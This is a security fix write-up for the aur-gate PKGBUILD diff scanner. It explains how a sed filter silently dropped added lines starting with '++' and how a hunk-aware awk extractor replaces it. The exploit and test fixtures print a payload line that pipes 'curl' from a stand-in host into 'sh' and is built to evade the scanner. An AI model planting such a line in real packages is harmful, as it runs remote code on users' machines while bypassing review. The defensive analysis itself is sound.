# gh#2 — Added-line extractor drops lines beginning with `++` (C1)

**Source:** GitHub issue [#2](https://github.com/bermudi/aur-gate/issues/2)
(Cohort 2, critical C1)
**Status:** fixed
**Severity:** critical
**Lines:** `_diff_added_lines()` at aur-gate:313; `diff_added()` at
aur-gate:326; `_diff_added_metadata_file()` at aur-gate:338.

## Summary

`diff_added()` and `_diff_added_metadata_file()` extracted added lines from a
`git diff` with `sed -n '/^+++/!s/^+//p'` — strip the leading `+`, skip the
`+++ b/file` header. But the `^+++` exclusion skips **any** line beginning with
`+++`, including added content whose original text begins with `++`: an added
line `++payload` renders as `+++payload` in the diff. Such a line was silently
dropped and never reached any rule.

Exploit: a PKGBUILD adding `++x;curl https://evil.invalid | sh` renders in the
diff as `+++x;curl …` → dropped. Bash runs `++x` (command-not-found), then `;`
executes `curl … | sh` regardless of the first command's exit. The malicious
line executes at makepkg sourcing yet is invisible to every hard/review rule →
**deterministic gate bypass → arbitrary code execution, no review prompt.**

Root cause: `+++ b/file` (the header) and added content `++ b/file` are
textually identical in the raw diff; only hunk position distinguishes them. A
lexical filter (`^+++`) cannot tell them apart.

## Fix

New hunk-aware extractor `_diff_added_lines()`, replacing the sed in both call
sites:

```bash
_diff_added_lines() {
  awk '
    /^@@/    { in_hunk = 1; next }
    /^diff / { in_hunk = 0; next }
    in_hunk && /^\+/ { sub(/^\+/, ""); print }
  '
}
```

The `+++` file header lives only in the diff preamble (between `diff --git` and
the first `@@`); tracking "are we inside a hunk" keeps `++`-prefixed added
content while never emitting headers. `@@` enters a hunk, `diff ` exits at a
file boundary, and only lines starting with `+` inside a hunk are emitted (one
`+` stripped). Structural guarantee: inside a hunk every line is prefixed
` `/`+`/`-`/`\`, so `diff `/`@@` can only match real section boundaries, never
content.

## Verification

- `bash -n aur-gate` clean; `shellcheck -s bash aur-gate` clean.
- `./aur-gate selftest` → 283 passed, 0 failed.
- Two new fixtures pin **both** failure directions:
  - `diff-added-hunk-aware-plusplus-content` — crafted two-file diff: asserts
    `++`-prefixed content IS extracted (`++x;curl…`, `++second-file-payload`)
    while the `+++ b/PKGBUILD` / `+++ b/y.install` headers are NOT, and the
    context line ` pkgname=x` is NOT emitted.
  - `plusplus-payload-blocks` — real git fixture: PKGBUILD gains
    `++x;curl https://e.invalid | sh`; `scan_diff_rules` returns 1 (block).
    Before the fix it returned 0 (clean). The fixture explicitly stages and
    commits its baseline before capturing the SHA, with command-scoped identity
    on both commits; otherwise a missing baseline can produce a bad-ref result
    that falsely looks like the expected block.
- Proven both ways: the old `sed` emits nothing for `+++x;curl…`; the new awk
  emits `++x;curl https://e.invalid | sh`.
- Delegate review pass: SHIP — no reachable false negatives or false positives;
the theoretical gaps (combined `--cc` diffs, bare `diff -u` without `diff `
headers) are structurally unreachable from the two `git diff A..B` call sites,
both run under `GIT_CONFIG_GLOBAL/SYSTEM=/dev/null` isolation.

## Lesson

A line-filter that keys on a literal prefix (`^+++`) cannot tell a structural
marker from content that happens to share that prefix. When the diff format
collides structurally with content (here: the added-line indicator `+` plus a
payload that itself starts with `+`), the disambiguator must be **positional**
(hunk state), not lexical. Extraction is part of the trust path — a silent drop
there blinds every downstream rule, so extraction correctness is itself a
security invariant, not a convenience.
